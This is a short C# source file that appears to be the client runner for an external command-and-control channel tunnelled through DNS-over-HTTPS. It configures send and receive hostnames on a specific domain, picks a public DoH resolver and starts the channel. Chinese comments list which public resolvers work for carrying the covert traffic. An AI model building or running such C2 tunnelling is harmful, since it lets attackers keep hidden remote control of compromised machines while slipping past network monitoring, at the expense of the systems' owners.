using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ExternalC2;

namespace DoHC2Runner
{
    class Program
    {
        static void Main(string[] args)
        {
            DoHC2 doh = new DoHC2();
            // Send Channel Hostname
            // Receive Channel Hostname
            // DNS over HTTPS (DoH) Resolver
            //不能使用的代理：
            //https://dns.alidns.com/dns-query (400报错)， https://dns.google.com/resolve (随机调换大小写)，
            //https://dns.ipv6dns.com/dns-query (400报错)(Yeti 国内)，https://dns.quad9.net/dns-query (400报错)
            //https://doh.opendns.com/dns-query (400报错)(OpenDNS 思科)
            //可以使用的代理：
            //(均为1326)https://cloudflare-dns.com/dns-query，
            //https://doh.pub/dns-query，
            //https://doh.360.cn (客户端发送一个包会传三个包给服务器端)
            //https://doh.dns.sb/dns-query /https://doh.sb/dns-query
            //(客户端发送一个包会传三个包给服务器端,且发送大负荷数据包会自动断连)(德国的公共DNS解析服务DNS.sb)
            //
            doh.Configure("send.htl502.tech","receive.htl502.tech", "https://doh.pub/dns-query");
            doh.Go();
            //请求端向服务器发送请求由于服务器当前链接太多，导致服务器方面无法给于正常的响应，产生此类(502)报错。
            // Readkey 用于程序停止时不立马关闭窗口 暂时不知实际效果
            Console.ReadLine();

        }
    }
}
